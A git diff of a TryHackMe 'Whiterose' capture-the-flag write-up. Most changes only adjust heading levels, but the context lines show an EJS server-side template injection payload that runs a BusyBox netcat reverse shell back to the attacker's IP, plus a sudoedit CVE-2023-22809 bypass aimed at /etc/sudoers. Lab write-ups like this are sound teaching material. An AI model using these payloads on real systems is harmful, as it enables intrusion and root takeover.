@@ -13,7 +13,7 @@ image:
 ![Tryhackme Room Link](room.png){: width="600" height="150" .shadow }
 _<https://tryhackme.com/room/whiterose>_
 
-### Task: 1 Welcome
+## Task: 1 Welcome
 **Welcome to Whiterose**   
   This challenge is based on the `Mr. Robot episode` "409 Conflict". Contains spoilers!
 Go ahead and start the machine, it may take a few minutes to fully start up.
@@ -21,7 +21,9 @@ And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`
 
 ![spider](spider.png){: width="800" height="150" .shadow }
 
-## Scanning
+## Getting Started 
+
+### Scanning
 As you know, scanning is the first phase of **reconnaissance** used to identify open ports and the services running on them. To gather this information, we use a powerful network scanning tool called `Nmap`
 ```console
 $ nmap -sCV 10.10.103.228             
@@ -230,7 +232,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 The response is coming back — so it's confirmed that `✅SSTI` (Server-Side Template Injection) is present. 
 
-### Shell
+## Shell
 To get a shell, I’m using `BusyBox` [Reverse Shell](https://www.revshells.com), but you can also use a Python reverse shell if Python is available on the target
 
 ```console
@@ -261,7 +263,7 @@ name=test&password=hacker&settings[view options][outputFunctionName]=x;process.m
 busybox nc 10.8.128.221 4444 -e bash
 ```
 
-### User Flag
+## User Flag
 So guys, we successfully got a shell!
 ![shell](shell.png){: width="800" height="150" .shadow }
 
@@ -279,7 +281,7 @@ press enter
 ```console
 cat /home/web/user.txt
 ```
-### Root Flag
+## Root Flag
 We found that we can run `sudoedit` as root without needing a password, but only for the specific file `/etc/nginx/sites-available/admin.cyprusbank.thm`
 
 After a brief search, we discovered a bypass for `sudoedit CVE-2023-22809.`[link](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis) This affects sudo versions up to **1.9.12p1** and lets us read and modify any files by setting the `EDITOR` environment variable
@@ -320,7 +322,7 @@ Gotcha! We are able to read the root flag
 >**Q: What is the root.txt flag?**
 ![tool](tool.png){: width="800" height="150" .shadow }
 
-### Root Shell
+## Root Shell
 Now it's time to become `root`.
 **To escalate our privileges to root, we try edit the `/etc/sudoers` file.**
 ```console
